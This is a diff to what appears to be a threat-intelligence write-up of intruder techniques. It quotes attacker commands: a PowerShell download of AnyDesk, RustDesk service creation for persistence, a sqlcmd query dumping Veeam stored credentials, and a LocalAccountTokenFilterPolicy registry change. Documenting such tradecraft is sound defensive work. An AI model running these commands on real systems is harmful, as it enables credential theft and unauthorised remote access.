@@ -294,16 +294,13 @@ cloudflared[.]exe service install REDACTED
 - C:\ProgramData\cloudflared_msi_install.log._BASE64_TOKEN
 - Chrome remote desktop
 - Anydesk
-
 ```
 “C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" -command
 "(new-object
 System.Net.WebClient).DownloadFile('hxxp://download[.]anydesk[.]com/AnyDesk
 .exe';, 'C:\ProgramData\AnyDesk.exe')"
 ```
-
 - rustdesk
-
 ```
 "C:\Windows\System32\cmd.exe" /C
 C:\Users\ADMINI~1\AppData\Local\Temp\RustDesk_install.bat
@@ -313,7 +310,6 @@ sc create RustDesk binpath= "\"C:\Program Files\RustDesk\RustDesk.exe\"
 \"C:\Users\Administrator\AppData\Roaming\RustDesk\config\RustDesk.toml\
 "" start= auto DisplayName= "RustDesk Service"
 ```
-
 - ScreenConnect
 - Reverse shells on esxi (python)
 - Ligolo-ng tunnel util
@@ -335,8 +331,7 @@ Credential Access:
  - Mimikatz
  - DCSync
  - DCE-RPC requestt to the ICertPassage Service (UnPAC the Hash)
- - `veeam credentials via` sqlcmd -S localhost\REDACTED_USERNAME -E -y500 -s ";" -Q
-"SELECT * FROM [VeeamBackup].[dbo].[Credentials];"
+ - veeam credentials via `sqlcmd -S localhost\REDACTED_USERNAME -E -y500 -s ";" -Q"SELECT * FROM [VeeamBackup].[dbo].[Credentials];"`
 
 <br>
 
@@ -361,7 +356,6 @@ icies\\System\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 - C:\Users\REDACTED\AppData\Local\Temp\hlpdrv.sys
 - HyperV check using a bat script
 - reg query
-
 ```
 "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios
 \HypervisorEnforcedCodeIntegrity" > nul 2>&1
